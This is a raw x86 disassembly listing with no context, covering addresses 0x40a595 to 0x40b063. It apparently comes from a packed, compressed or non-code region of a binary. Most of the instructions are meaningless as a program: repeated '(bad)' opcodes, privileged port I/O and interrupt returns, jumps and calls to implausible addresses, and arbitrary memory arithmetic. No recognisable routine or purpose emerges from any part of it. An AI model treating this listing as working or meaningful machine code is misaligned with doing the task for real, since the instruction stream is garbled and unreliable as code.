  40a595:	push   edx
  40a596:	dec    esi
  40a597:	call   0xffcc8893
  40a59c:	jne    0x40a5ab
  40a59e:	jb     0x40a521
  40a5a0:	mov    ds:0xb5ff8bd2,al
  40a5a5:	fst    DWORD PTR [ebx+0xdc2ffff]
  40a5ab:	pop    es
  40a5ac:	call   0x3fe2c7
  40a5b1:	sbb    al,0xed
  40a5b3:	jbe    0x40a595
  40a5b5:	jmp    0x40a59b
  40a5b7:	xor    bh,bh
	...
  40a5e1:	add    BYTE PTR [ecx-0x34],dl
  40a5e4:	sbb    ah,BYTE PTR [ebp+0x7e]
  40a5e7:	push   esp
  40a5e8:	xor    edi,edi
  40a5ea:	xchg   ecx,eax
  40a5eb:	out    dx,eax
  40a5ec:	cmp    bh,bh
  40a5ee:	ret    
  40a5ef:	inc    esp
  40a5f0:	mov    bh,0x7
  40a5f2:	les    edx,FWORD PTR [eiz*2+0x7734b3ff]
  40a5f9:	in     al,0xb3
  40a5fb:	sub    al,0x31
  40a5fd:	call   0xff7184e7
  40a602:	fwait
  40a603:	push   esi
  40a604:	and    al,0xf7
  40a606:	xchg   ebx,eax
  40a607:	xchg   esp,eax
  40a608:	sbb    al,0x2e
  40a60a:	ror    DWORD PTR [ecx+esi*1+0x3997c9ff],0xff
  40a612:	jnp    0x40a67f
  40a614:	in     eax,0xa4
  40a616:	jae    0x40a68c
  40a618:	xor    DWORD PTR [ebp-0xce8b8c],esi
  40a61e:	je     0x40a5eb
  40a620:	call   FWORD PTR gs:[ebx+0x5c]
  40a624:	ja     0x40a602
  40a626:	dec    ebx
  40a627:	aam    0x2f
  40a629:	call   0xff71cd47
  40a62e:	inc    ebx
  40a62f:	mov    ?,WORD PTR [edi+esi*8]
  40a632:	cmp    edi,DWORD PTR [edi+ebp*1-0x4a4adf8b]
  40a639:	pop    es
  40a63a:	xor    al,0x6e
  40a63c:	xor    bh,bh
  40a63e:	and    esp,DWORD PTR [ebp+esi*2+0x2f9e13f0]
  40a645:	call   0x40a64a
	...
  40a66e:	add    BYTE PTR ds:0xbff2fdf,cl
  40a674:	mov    BYTE PTR [ecx+ebp*8],ch
  40a677:	ins    DWORD PTR es:[edi],dx
  40a678:	add    al,0x30
  40a67a:	(bad)  
  40a67b:	sti    
  40a67c:	pop    ebx
  40a67d:	sbb    al,0x30
  40a67f:	add    al,0x67
  40a681:	js     0x40a686
  40a683:	sbb    al,0xa2
  40a685:	stos   BYTE PTR es:[edi],al
  40a686:	jmp    ebx
  40a688:	das    
  40a689:	bound  ebx,QWORD PTR [edi]
  40a68b:	lahf   
  40a68c:	lahf   
  40a68d:	test   BYTE PTR [ebp+0x30d642d3],bl
  40a693:	push   ecx
  40a694:	arpl   WORD PTR [ecx+0x6dd47e04],ax
  40a69a:	jp     0x40a6fd
  40a69c:	xlat   BYTE PTR ds:[ebx]
  40a69d:	rcl    BYTE PTR [edx],1
  40a69f:	push   edi
  40a6a0:	sbb    ch,cl
  40a6a2:	xor    cl,dh
  40a6a4:	mov    ecx,0xd5a3c2a0
  40a6a9:	sar    ebx,cl
  40a6ab:	or     ebp,0x43
  40a6ae:	xor    BYTE PTR [ebx-0x233327bd],dl
  40a6b4:	pop    edx
  40a6b5:	rol    DWORD PTR ds:0x30695b1c,0xf1
  40a6bc:	bound  edx,QWORD PTR [ecx]
  40a6be:	daa    
  40a6bf:	jno    0x40a695
  40a6c1:	sbb    eax,0x15d6f130
  40a6c6:	mov    dh,0x1b
  40a6c8:	ret    
  40a6c9:	mul    BYTE PTR [ebp+0x5b]
  40a6cc:	aam    0x2f
  40a6ce:	inc    ebp
  40a6cf:	sbb    BYTE PTR [ebx-0x6c],bl
  40a6d2:	jl     0x40a6d4
	...
  40a6fc:	cmp    dl,bl
  40a6fe:	sub    al,0x1f
  40a700:	dec    ebx
  40a701:	aam    0xed
  40a703:	jge    0x40a6e6
  40a705:	(bad)  
  40a706:	cmp    BYTE PTR [edi],ch
  40a708:	test   eax,0x17b9de6a
  40a70d:	ret    
  40a70e:	xchg   BYTE PTR [esp+ebx*1+0x2b43e25b],dl
  40a715:	fidiv  WORD PTR [ebp+0x4]
  40a718:	sbb    al,0x5b
  40a71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a71b:	leave  
  40a71c:	adc    ebx,DWORD PTR [ebx+0x0]
  40a71f:	jmp    0x25080243
  40a724:	xor    al,0xd4
  40a726:	push   es
  40a727:	jmp    0x1340e84b
  40a72c:	and    BYTE PTR [ecx+0x0],al
  40a72f:	add    ebx,DWORD PTR [eax]
  40a731:	out    0x44,al
  40a733:	xchg   ebp,eax
  40a734:	lock out 0x84,al
  40a737:	jge    0x40a744
  40a739:	aam    0xfe
  40a73b:	sbb    ebx,edi
  40a73d:	dec    ebp
  40a73e:	clc    
  40a73f:	jbe    0x40a6c6
  40a741:	iret   
  40a742:	out    0x4f,eax
  40a744:	nop
  40a745:	pop    edx
  40a746:	add    dl,dh
  40a748:	pop    edi
  40a749:	dec    edi
  40a74a:	add    dl,BYTE PTR [edx-0x3b]
  40a74d:	out    0x84,al
  40a74f:	inc    ebp
  40a750:	jmp    0x40a725
  40a752:	(bad)  
  40a753:	mov    ecx,0x3ef3dd9c
  40a758:	inc    ebx
  40a759:	aam    0x4f
  40a75b:	lds    esp,FWORD PTR ds:[ebx-0x1]
  40a75f:	mov    esp,0x0
	...
  40a788:	add    BYTE PTR [ebx+0x4b8640bb],al
  40a78e:	aam    0x88
  40a790:	ins    BYTE PTR es:[edi],dx
  40a791:	sub    ah,cl
  40a793:	(bad)  
  40a794:	push   ds
  40a795:	adc    esi,DWORD PTR [si-0x35]
  40a799:	sahf   
  40a79a:	adc    eax,0xd40b16ec
  40a79f:	(bad)  
  40a7a0:	jl     0x40a7c2
  40a7a2:	inc    ebx
  40a7a3:	add    cl,ch
  40a7a5:	sub    dl,BYTE PTR ds:0xcbfc3cff
  40a7ab:	(bad)  
  40a7ac:	out    dx,al
  40a7ad:	or     cl,BYTE PTR [esi]
  40a7af:	lock fiadd WORD PTR [edx]
  40a7b2:	aam    0xfe
  40a7b4:	push   esp
  40a7b5:	sub    BYTE PTR [ebx-0x2c0d5f4c],bh
  40a7bb:	(bad)  
  40a7bc:	xchg   esp,eax
  40a7bd:	dec    edi
  40a7be:	retf   0xfe
  40a7c1:	fidiv  DWORD PTR [esi-0xe]
  40a7c4:	mov    ds:0x45ff81ca,eax
  40a7c9:	int    0x75
  40a7cb:	cmp    bh,0x30
  40a7ce:	mov    ebp,eax
  40a7d0:	adc    DWORD PTR [ebp+0x5e],esi
  40a7d3:	add    cl,cl
  40a7d5:	mov    bh,0xd2
  40a7d7:	(bad)  
  40a7d8:	push   esp
  40a7d9:	jle    0x40a84d
  40a7db:	add    esp,0xffffffa9
  40a7de:	hlt    
  40a7df:	(bad)  
  40a7e0:	imul   edi,DWORD PTR [ebp-0x52f78a7f],0x4affa159
  40a7ea:	dec    edi
  40a7eb:	inc    ebp
  40a7ec:	cld    
	...
  40a815:	add    BYTE PTR ds:0xc54159c9,bl
  40a81b:	xor    DWORD PTR ds:0xfe976de1,0xe6d6c0fe
  40a825:	and    eax,0x68ff80ea
  40a82a:	xchg   ebx,eax
  40a82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a82c:	aas    
  40a82d:	add    BYTE PTR [ebp+0x5c],ch
  40a830:	add    BYTE PTR [eax],al
  40a832:	cmc    
  40a833:	xor    BYTE PTR [ebp+0x8],0xdd
  40a837:	ins    BYTE PTR es:[edi],dx
  40a838:	(bad)  
  40a839:	(bad)  
  40a83a:	cmp    dh,dh
  40a83c:	dec    ebp
  40a83d:	pop    ebx
  40a83e:	mov    ah,0x5e
  40a840:	push   DWORD PTR ds:0x401614
  40a846:	sub    dl,BYTE PTR [ebx]
  40a848:	pop    es
  40a849:	call   0x402993
  40a84e:	lods   eax,DWORD PTR ds:[esi]
  40a84f:	adc    DWORD PTR [edx+0x41],ebx
  40a852:	xor    eax,0x450000f6
  40a857:	fdivp  st(6),st
  40a859:	jne    0x40a888
  40a85b:	jbe    0x40a84b
  40a85d:	dec    BYTE PTR [edx-0x80]
  40a860:	push   DWORD PTR [ebp+0x1c]
  40a863:	test   al,0x2c
  40a865:	jne    0x40a88b
  40a867:	pushf  
  40a868:	mov    al,ss:0xc23a9913
  40a86e:	and    ah,al
  40a870:	aad    0x8a
  40a872:	lock or BYTE PTR [edi+0x6504040b],dh
  40a879:	inc    DWORD PTR [eax]
	...
  40a8a3:	repz int3 
  40a8a5:	inc    edx
  40a8a6:	je     0x40a902
  40a8a8:	ins    BYTE PTR es:[edi],dx
  40a8a9:	jl     0x40a906
  40a8ab:	pop    ebp
  40a8ac:	(bad)  
  40a8ad:	shl    bh,cl
  40a8af:	push   0x6cff2d19
  40a8b4:	je     0x40a88a
  40a8b6:	addr16 sbb al,0xc4
  40a8b9:	sbb    edi,DWORD PTR [esi+0x40c7d634]
  40a8bf:	sbb    al,0x74
  40a8c1:	sub    eax,0xf72c2475
  40a8c6:	retf   
  40a8c7:	stos   DWORD PTR es:[edi],eax
  40a8c8:	xor    ah,cl
  40a8ca:	addr16 sbb eax,0x4be1bc4
  40a8d0:	test   eax,0xf41c40c7
  40a8d5:	sub    esi,DWORD PTR [ebp+0x14]
  40a8d8:	sub    al,0xe3
  40a8da:	retf   
  40a8db:	or     DWORD PTR [eax-0x3be19834],0x1b
  40a8e2:	mov    esi,0x40c7f804
  40a8e7:	sbb    al,0x14
  40a8e9:	sub    al,0x75
  40a8eb:	adc    al,0x5c
  40a8ed:	dec    ebx
  40a8ef:	pop    ebx
  40a8f0:	pusha  
  40a8f1:	sbb    al,0x16
  40a8f3:	jg     0x40a94d
  40a8f5:	sub    eax,0x2cb5ec9
  40a8fa:	push   ebp
  40a8fb:	xchg   edi,eax
  40a8fc:	push   edi
  40a8fd:	add    esp,0x6a02dd38
  40a903:	adc    eax,0xb6e65b
	...
  40a930:	and    eax,ebx
  40a932:	and    BYTE PTR [ebx+eiz*1-0x2f],ah
  40a936:	pop    edi
  40a937:	(bad)  
  40a938:	pop    ss
  40a939:	inc    esi
  40a93a:	repz sub al,0x89
  40a93d:	arpl   cx,dx
  40a93f:	or     DWORD PTR [ebx],0xffffffd1
  40a942:	mov    ebp,0x3bd03e99
  40a947:	cld    
  40a948:	add    ecx,DWORD PTR [edx-0x52]
  40a94b:	sub    al,0xf3
  40a94d:	inc    ebp
  40a94e:	add    eax,0x9163712d
  40a953:	lahf   
  40a954:	loop   0x40a926
  40a956:	xchg   ebp,eax
  40a957:	sub    al,0x51
  40a959:	iret   
  40a95a:	lea    esi,[esi+0x641ac31b]
  40a960:	retf   
  40a961:	shr    BYTE PTR [edi+0x1c5b1841],1
  40a967:	jns    0x40a931
  40a969:	fsub   QWORD PTR [edi+ebp*1+0x1bf546b3]
  40a970:	push   es
  40a971:	clc    
  40a972:	pop    ebp
  40a973:	sub    al,0x17
  40a975:	fwait
  40a976:	in     eax,0x87
  40a978:	mov    edi,0xa503e95b
  40a97d:	push   ss
  40a97e:	inc    ebp
  40a97f:	or     BYTE PTR [ecx],0x6b
  40a982:	jmp    0xbc10bb3e
  40a987:	adc    edi,DWORD PTR [ebx+0x46]
  40a98a:	sub    eax,0x25f9951b
  40a98f:	sub    al,0x95
  40a991:	push   ss
  40a992:	sbb    eax,0x9b
	...
  40a9bb:	add    BYTE PTR [eax],al
  40a9bd:	mov    esi,0x5b03a834
  40a9c2:	inc    esi
  40a9c3:	or     eax,0x5f9091b
  40a9c8:	sub    al,0xec
  40a9ca:	inc    edx
  40a9cb:	jmp    0x51dcd3
  40a9d0:	cdq    
  40a9d1:	or     BYTE PTR [esi+0x8],al
  40a9d4:	add    DWORD PTR [ebx+0x8e6fea3],ecx
  40a9da:	frstor [ecx-0x2ebd0822]
  40a9e0:	xor    ah,cl
  40a9e2:	iret   
  40a9e3:	std    
  40a9e4:	push   esp
  40a9e5:	inc    esp
  40a9e6:	ret    
  40a9e7:	adc    ecx,DWORD PTR [edi+0x514fd037]
  40a9ed:	sbb    DWORD PTR [ebx-0x11],ebx
  40a9f0:	ja     0x40a9c2
  40a9f2:	shl    BYTE PTR [ecx+eiz*8+0x17],1
  40a9f6:	dec    esp
  40a9f7:	enter  0x37a6,0xc3
  40a9fb:	pusha  
  40a9fc:	dec    ebx
  40a9fd:	aaa    
  40a9fe:	shl    BYTE PTR [edi+0x5e],1
  40aa01:	jmp    0x40aa1d
  40aa03:	add    BYTE PTR [esi+0x7ae7d38d],cl
  40aa09:	cmp    eax,0xa019fed0
  40aa0e:	iret   
  40aa0f:	inc    BYTE PTR [esi-0xb00d4ba]
  40aa15:	mov    bh,0xb7
  40aa17:	push   ecx
  40aa18:	xor    edi,esi
  40aa1a:	iret   
  40aa1b:	out    0xa9,eax
  40aa1d:	cmp    eax,edx
  40aa1f:	inc    cl
	...
  40aa49:	add    BYTE PTR [edi],dh
  40aa4b:	xor    al,0x41
  40aa4d:	jmp    0x523cf098
  40aa52:	repnz cmc 
  40aa54:	(bad)  
  40aa55:	ds push 0x16e90137
  40aa5b:	adc    DWORD PTR [eax+0x2e],edx
  40aa5e:	lods   eax,DWORD PTR ds:[esi]
  40aa5f:	push   edi
  40aa60:	call   0xff10d23d
  40aa65:	adc    DWORD PTR [edi],edx
  40aa67:	std    
  40aa68:	(bad)  
  40aa69:	push   ss
  40aa6a:	pop    es
  40aa6b:	inc    esi
  40aa6c:	cld    
  40aa6d:	add    DWORD PTR [edi],ebp
  40aa6f:	std    
  40aa70:	inc    BYTE PTR [eax]
  40aa72:	and    cl,BYTE PTR [esi-0x55caf33e]
  40aa78:	mov    esp,ebp
  40aa7a:	(bad)  
  40aa7b:	sbb    bh,ah
  40aa7d:	push   0x45
  40aa7f:	in     eax,dx
  40aa80:	sbb    bh,bh
  40aa82:	enter  0xe6ce,0x39
  40aa86:	mov    ds:0x4889ff84,al
  40aa8b:	sub    DWORD PTR [edx+0x0],0x5f
  40aa8f:	pop    ebp
  40aa90:	push   DWORD PTR [ebp+0xd]
  40aa93:	jae    0x40aab7
  40aa95:	inc    edx
  40aa97:	sub    DWORD PTR [edx+0x0],0x75fdb65f
  40aa9e:	std    
  40aa9f:	jb     0x40aab7
  40aaa1:	inc    edx
  40aaa3:	sub    DWORD PTR [edx+0x0],0x75ff630f
  40aaaa:	mov    ebp,0xff0a72
	...
  40aad7:	mov    ds:0x1056881,al
  40aadc:	cwde   
  40aadd:	(bad)  
  40aade:	imul   edi,DWORD PTR [edi-0x62f78a7f],0x42fffe7d
  40aae8:	repnz add ebx,DWORD PTR [esp+esi*2+0x5a]
  40aaed:	push   0x23
  40aaef:	inc    edx
  40aaf0:	or     eax,DWORD PTR [edi]
  40aaf2:	call   0x402ed8
  40aaf7:	pop    ebp
  40aaf8:	pop    ebx
  40aaf9:	pop    esp
  40aafa:	inc    ecx
  40aafb:	jne    0x40aaed
  40aafd:	sbb    bh,bh
  40aaff:	enter  0xe6d2,0xdd
  40ab03:	xor    eax,DWORD PTR [ecx+0x76a8ffff]
  40ab09:	push   DWORD PTR [ebp+0x6d]
  40ab0c:	jb     0x40ab2e
  40ab0e:	lahf   
  40ab0f:	add    al,BYTE PTR [ecx-0x3fe33d37]
  40ab15:	add    dl,BYTE PTR [ebp-0x59]
  40ab18:	rol    BYTE PTR [edx+0x28cd34c4],1
  40ab1e:	call   DWORD PTR [ecx+0x3b5026f7]
  40ab24:	dec    edi
  40ab25:	adc    edi,edi
  40ab27:	test   eax,0x99b81aaf
  40ab2c:	les    eax,FWORD PTR [edx]
  40ab2e:	or     ebx,DWORD PTR [ebp+edi*4+0x7d]
  40ab32:	inc    edi
  40ab33:	sbb    eax,0x59c702c4
  40ab38:	lods   al,BYTE PTR ds:[esi]
  40ab39:	add    eax,DWORD PTR [eax]
	...
  40ab63:	add    BYTE PTR [esp+eax*8],bl
  40ab66:	aas    
  40ab67:	inc    ebp
  40ab68:	or     BYTE PTR ds:0x1a1c0001,cl
  40ab6e:	add    al,0x6a
  40ab70:	sbb    al,0x1a
  40ab72:	add    al,0x6a
  40ab74:	sbb    al,0x47
  40ab76:	mov    edi,0x7f3f4cf3
  40ab7b:	hlt    
  40ab7c:	shl    esp,cl
  40ab7e:	sub    BYTE PTR [eax-0x2d],dl
  40ab81:	data16 sub al,0xff
  40ab84:	push   ecx
  40ab85:	fcomp  DWORD PTR [ebx]
  40ab87:	mov    dl,BYTE PTR [ecx-0x23f4fd3d]
  40ab8d:	iret   
  40ab8e:	std    
  40ab8f:	call   0x436eba
  40ab94:	xor    al,0xf7
  40ab96:	mov    ebx,0xaf2d1c40
  40ab9b:	je     0x94400c29
  40aba1:	adc    edi,DWORD PTR [eax+edx*8-0x67]
  40aba5:	ds xor bh,dh
  40aba8:	or     DWORD PTR [esp+edx*8+0x60788451],0xffffffff
  40abb0:	jae    0x40abec
  40abb2:	jg     0x40aba4
  40abb4:	jae    0x40ac10
  40abb6:	sub    DWORD PTR es:[ebx+edi*2+0x48],esi
  40abbb:	sub    DWORD PTR [ebx+0x40],ebx
  40abbe:	jmp    0xa86f6b5e
  40abc3:	add    ecx,DWORD PTR [ebx+0x7]
  40abc6:	stc    
  40abc7:	xor    BYTE PTR [eax],al
	...
  40abf1:	inc    ebx
  40abf2:	int    0xfd
  40abf4:	scas   al,BYTE PTR es:[edi]
  40abf5:	daa    
  40abf6:	ret    
  40abf7:	int3   
  40abf8:	pop    edi
  40abf9:	xor    ecx,ebp
  40abfb:	pop    edi
  40abfc:	jg     0x40ac36
  40abfe:	(bad)
  40ac01:	mov    dh,0x5a
  40ac03:	push   ecx
  40ac04:	mov    ah,0x77
  40ac06:	sbb    ch,cl
  40ac08:	sub    cl,cl
  40ac0a:	retf   
  40ac0b:	aad    0x28
  40ac0d:	or     ecx,ebp
  40ac0f:	cmp    edi,eax
  40ac11:	sti    
  40ac12:	bound  eax,QWORD PTR [ebp+0x6be2fb28]
  40ac18:	sbb    ebp,ebx
  40ac1a:	int3   
  40ac1b:	lods   eax,DWORD PTR ds:[esi]
  40ac1c:	test   BYTE PTR [ecx-0x1cd76241],ch
  40ac22:	pop    ebx
  40ac23:	adc    eax,0xe95b43f4
  40ac28:	sbb    BYTE PTR [edx+0x5cc7bd43],dl
  40ac2e:	pop    ebx
  40ac2f:	xchg   BYTE PTR [esi-0x50],ch
  40ac32:	les    edi,FWORD PTR [ebp+0x28]
  40ac35:	mov    ebx,0x701be146
  40ac3a:	mov    ds:0x5a34286d,al
  40ac3f:	jmp    0x17840e5c
  40ac44:	enter  0x5adc,0x56
  40ac48:	outs   dx,BYTE PTR ds:[esi]
  40ac49:	add    ah,0x4d
  40ac4c:	sub    BYTE PTR [ebx-0x47e40eba],cl
  40ac52:	mov    ds:0x283d,al
	...
  40ac7b:	add    BYTE PTR [eax],al
  40ac7d:	add    BYTE PTR [edi+0x2c41000e],bl
  40ac83:	int3   
  40ac84:	(bad)  
  40ac85:	jmp    0xe9a92945
  40ac8a:	pop    ds
  40ac8b:	mov    esp,0x307391bd
  40ac90:	inc    ecx
  40ac91:	jmp    0x1728b29a
  40ac96:	hlt    
  40ac97:	retf   
  40ac98:	(bad)  
  40ac99:	jl     0x40ace2
  40ac9b:	mov    ah,0x82
  40ac9d:	xor    BYTE PTR [esp+ecx*8],al
  40aca0:	addr16 call 0x81fe68c5
  40aca6:	sub    eax,0xfae94130
  40acab:	add    eax,0xcc43d6e8
  40acb0:	(bad)  
  40acb1:	pop    esp
  40acb2:	adc    BYTE PTR [edx+ebp*2-0x133bc60],dh
  40acb9:	jl     0x40acdf
  40acbb:	(bad)  
  40acbc:	(bad)  
  40acbd:	mov    esi,0xb6a03d18
  40acc2:	cmp    ecx,esp
  40acc4:	mov    ah,0xc1
  40acc6:	cmp    ecx,esp
  40acc8:	(bad)  
  40acc9:	xchg   ecx,eax
  40acca:	mov    edi,0x39efeeb
  40accf:	push   es
  40acd0:	lock sahf 
  40acd2:	sti    
  40acd3:	retf   
  40acd4:	(bad)  
  40acd5:	adc    al,0xc4
  40acd7:	int3   
  40acd8:	je     0x40accb
  40acda:	daa    
  40acdb:	pop    es
  40acdc:	(bad)  
  40acdd:	jle    0x40ace2
  40acdf:	int3   
  40ace0:	mov    ah,0x79
	...
  40ad0a:	add    BYTE PTR [ebx],al
  40ad0c:	int3   
  40ad0d:	inc    BYTE PTR [ecx+0x66feeb6b]
  40ad13:	sti    
  40ad14:	adc    eax,0xcd5850f8
  40ad19:	(bad)  
  40ad1a:	push   esi
  40ad1b:	cmp    eax,DWORD PTR [esi-0x4]
  40ad1e:	inc    ecx
  40ad1f:	mov    edi,0x75ffffdf
  40ad24:	mov    es,edx
  40ad26:	or     al,0x85
  40ad28:	stos   BYTE PTR es:[edi],al
  40ad29:	mov    esp,ebp
  40ad2b:	sub    cl,BYTE PTR [edx]
  40ad2d:	or     ebp,eax
  40ad2f:	cmc    
  40ad30:	cmp    bh,bh
  40ad32:	jmp    FWORD PTR [esi+0x17]
  40ad35:	je     0x40ad70
  40ad37:	lods   eax,DWORD PTR ds:[esi]
  40ad38:	xchg   edi,eax
  40ad39:	pop    edx
  40ad3a:	inc    ecx
  40ad3b:	inc    ebp
  40ad3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad3d:	out    0xc,al
  40ad3f:	loope  0x40adb4
  40ad41:	call   DWORD PTR [eax-0x5b]
  40ad44:	out    dx,eax
  40ad45:	(bad)  
  40ad46:	jmp    FWORD PTR [edx]
  40ad48:	xor    eax,0x96892c68
  40ad4d:	dec    BYTE PTR [edi+0x3a]
  40ad50:	or     al,BYTE PTR [edi]
  40ad52:	call   0x403c9a
  40ad57:	pop    ebp
  40ad58:	out    0xff,eax
  40ad5a:	(bad)  
  40ad5b:	fiadd  DWORD PTR [eax+0x68]
  40ad5e:	cmp    DWORD PTR ss:[eax+0xbda4ffe],esp
  40ad65:	pop    es
  40ad66:	call   0x403452
  40ad6b:	frstor [ebp-0x61]
  40ad6e:	inc    DWORD PTR [eax]
	...
  40ad98:	mov    edx,0xf508c287
  40ad9d:	stos   DWORD PTR es:[edi],eax
  40ad9e:	mov    esp,ebp
  40ada0:	inc    esi
  40ada1:	mov    bh,ah
  40ada3:	push   esi
  40ada4:	adc    ah,ch
  40ada6:	(bad)  
  40ada7:	imul   ecx,esi,0xad087581
  40adad:	lds    ebx,FWORD PTR [ebx+0x45473aff]
  40adb3:	cld    
  40adb4:	ds retf 
  40adb6:	arpl   WORD PTR [eax-0xc],cx
  40adb9:	pop    esi
  40adba:	mov    edi,DWORD PTR ds:0x4006cc
  40adc0:	add    eax,0x1c0efec1
  40adc5:	cmp    BYTE PTR [edx+0x0],ch
  40adc8:	sbb    al,0xb4
  40adca:	call   0x8456:0x2f2e020
  40add1:	shl    BYTE PTR [esi+0x0],cl
  40add4:	sbb    al,0xbd
  40add6:	inc    edx
  40add7:	je     0x40adb3
  40add9:	repz cmp BYTE PTR [eax],0x1c
  40addd:	sar    DWORD PTR [esi-0x79],1
  40ade0:	sbb    al,0xb4
  40ade2:	add    dl,BYTE PTR [eax-0x3c]
  40ade5:	xchg   edx,eax
  40ade6:	mov    BYTE PTR [eax+0x1c],0x5c
  40adea:	cwde   
  40adeb:	mov    DWORD PTR [esp+esi*4],ebx
  40adee:	enter  0x5e02,0xe4
  40adf2:	sbb    ah,BYTE PTR [eax-0x7b]
  40adf5:	shl    DWORD PTR [eax+edx*2],1
  40adf8:	int3   
  40adf9:	fild   DWORD PTR [edx]
	...
  40ae23:	add    BYTE PTR [eax],al
  40ae25:	xor    eax,DWORD PTR [edx]
  40ae27:	pushf  
  40ae28:	sub    edi,DWORD PTR [eax+0x73]
  40ae2b:	add    al,0x50
  40ae2d:	adc    esp,DWORD PTR [edi]
  40ae2f:	cld    
  40ae30:	out    0x77,eax
  40ae32:	cld    
  40ae33:	and    al,0xff
  40ae35:	fs sub al,0x3
  40ae38:	add    BYTE PTR [ebx],cl
  40ae3a:	dec    edx
  40ae3b:	pushf  
  40ae3c:	xor    eax,0x50047350
  40ae41:	jmp    0x40add1
  40ae43:	cld    
  40ae44:	out    0x4b,eax
  40ae46:	or     al,0x25
  40ae48:	inc    esp
  40ae4a:	push   ebx
  40ae4b:	test   edi,edi
  40ae4d:	rcr    esp,cl
  40ae4f:	shl    BYTE PTR [edi+0x25],0x78
  40ae53:	ret    
  40ae54:	jmp    FWORD PTR [edx-0x14]
  40ae57:	cmp    al,0x8b
  40ae59:	sbb    al,0xb4
  40ae5b:	idiv   DWORD PTR [edi-0x1832f7d8]
  40ae61:	pop    es
  40ae62:	sbb    esp,DWORD PTR ds:0xb95b4cff
  40ae68:	fwait
  40ae69:	fwait
  40ae6a:	leave  
  40ae6b:	dec    ebp
  40ae6c:	data16 add al,0x77
  40ae6f:	mov    ch,0xc2
  40ae71:	mov    ebx,DWORD PTR [ecx]
  40ae73:	dec    esi
  40ae74:	scas   eax,DWORD PTR es:[edi]
  40ae75:	sbb    esi,DWORD PTR [ebx-0x3684c3f2]
  40ae7b:	mov    al,ds:0x465b1c9b
  40ae80:	data16 hlt 
  40ae82:	nop
  40ae83:	(bad)  
  40ae84:	ret    0x1963
  40ae87:	es scas eax,DWORD PTR es:[edi]
	...
  40aeb1:	add    BYTE PTR [ebx],ah
  40aeb3:	mov    bl,0xfa
  40aeb5:	cmp    edx,DWORD PTR [ebx-0x37]
  40aeb8:	add    BYTE PTR [ecx],cl
  40aeba:	stos   DWORD PTR es:[edi],eax
  40aebb:	leave  
  40aebc:	or     eax,0x69211d19
  40aec1:	out    0x3b,al
  40aec3:	dec    esi
  40aec4:	add    edi,DWORD PTR [esi+0x6b298d37]
  40aeca:	sub    ecx,ecx
  40aecc:	in     eax,dx
  40aecd:	and    al,0x2e
  40aecf:	clc    
  40aed0:	and    ch,bh
  40aed2:	sub    bl,dh
  40aed4:	and    esp,DWORD PTR ds:0xa42c913
  40aeda:	or     ecx,DWORD PTR [edi-0x1f]
  40aedd:	sbb    ebx,edi
  40aedf:	leave  
  40aee0:	lds    esp,FWORD PTR [esi+eax*4]
  40aee3:	jl     0x40aea3
  40aee5:	scas   al,BYTE PTR es:[edi]
  40aee6:	sbb    esi,DWORD PTR [ebx-0x3714da91]
  40aeec:	inc    edx
  40aeed:	or     bl,ah
  40aeef:	dec    esi
  40aef0:	icebp  
  40aef1:	sbb    ecx,DWORD PTR [ebx+0x44249dc9]
  40aef7:	sub    eax,0xc9cbc335
  40aefc:	shl    DWORD PTR [edx],cl
  40aefe:	push   esp
  40aeff:	sbb    ch,cl
  40af01:	and    al,0x31
  40af03:	push   ebx
  40af04:	xchg   ecx,eax
  40af05:	repnz mov al,0xc8
  40af08:	push   DWORD PTR [ebp-0x79]
  40af0b:	sub    bl,BYTE PTR [eax+ebp*1+0x18]
  40af0f:	xor    eax,DWORD PTR [edx]
  40af11:	jmp    0xd53f8a35
	...
  40af3e:	add    BYTE PTR [edi+0x40541ec0],dl
  40af44:	enter  0xd4fe,0x3b
  40af48:	enter  0xf174,0x17
  40af4c:	mov    ebx,DWORD PTR [esi+edi*1+0x205e2838]
  40af53:	fstp   QWORD PTR [esi+0x0]
  40af56:	xchg   esp,eax
  40af57:	in     al,0xb6
  40af59:	sub    BYTE PTR ds:0x1efecfef,0xca
  40af60:	sbb    eax,0x4e00b9fc
  40af65:	adc    BYTE PTR [esi],cl
  40af67:	jb     0x40afbd
  40af69:	call   0x9b649d
  40af6e:	repnz fist WORD PTR [edi-0x7b]
  40af72:	stos   DWORD PTR es:[edi],eax
  40af73:	sbb    eax,0x6226005b
  40af78:	sar    bh,1
  40af7a:	call   0x25080a9e
  40af7f:	xor    al,0xc8
  40af81:	push   es
  40af82:	jmp    0x4340e4a6
  40af87:	sbb    BYTE PTR ds:0xd6205300,dh
  40af8d:	inc    esp
  40af8e:	mov    ch,0xa8
  40af90:	(bad)  
  40af91:	test   BYTE PTR [ebp+0x19fec807],bh
  40af97:	aas    
  40af98:	dec    esi
  40af99:	clc    
  40af9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af9b:	mov    ch,0xc3
  40af9d:	out    0x81,eax
  40af9f:	mov    ds:0xe2005a,al
	...
  40afcc:	pop    edi
  40afcd:	dec    edi
  40afce:	add    eax,0x5d1580
  40afd3:	add    ch,al
  40afd5:	repz mov ebx,0xff5f0448
  40afdb:	jne    0x40afa2
  40afdd:	jae    0x40afc8
  40afdf:	mov    eax,ds:0x8b507c32
  40afe4:	push   ebp
  40afe5:	jmp    0x50ff:0x7beaf484
  40afec:	(bad)  
  40afed:	jae    0x40afc8
  40afef:	mov    eax,ds:0x85897bd2
  40aff4:	xor    eax,0xcdffff64
  40aff9:	retf   
  40affa:	pushf  
  40affb:	push   DWORD PTR [edx]
  40affd:	stc    
  40affe:	(bad)  
  40afff:	lods   eax,DWORD PTR ds:[si]
  40b001:	pop    es
  40b002:	inc    eax
  40b003:	add    BYTE PTR [edx],al
  40b005:	and    dh,al
  40b007:	div    DWORD PTR [edx]
  40b009:	jl     0x40b00a
  40b00b:	jne    0x40b04e
  40b00d:	jae    0x40b041
  40b00f:	mov    eax,ds:0x85897c12
  40b014:	sub    DWORD PTR [edi+edi*8-0x1],esp
  40b018:	(bad)  
  40b019:	pop    ebx
  40b01a:	push   0xfe9e9181
  40b01f:	(bad)  
  40b020:	call   0x340a793
  40b025:	jp     0x40b09c
  40b027:	or     al,0xed
  40b029:	rcr    DWORD PTR [edi-0x7b280d01],0xec
	...
  40b058:	add    dl,ch
  40b05a:	jns    0x40b05b
  40b05c:	push   0x5
  40b05e:	xrelease mov BYTE PTR [esp+eax*2+0x5f],bl
  40b063:	push   DWORD PTR [ebp-0x9e5b]
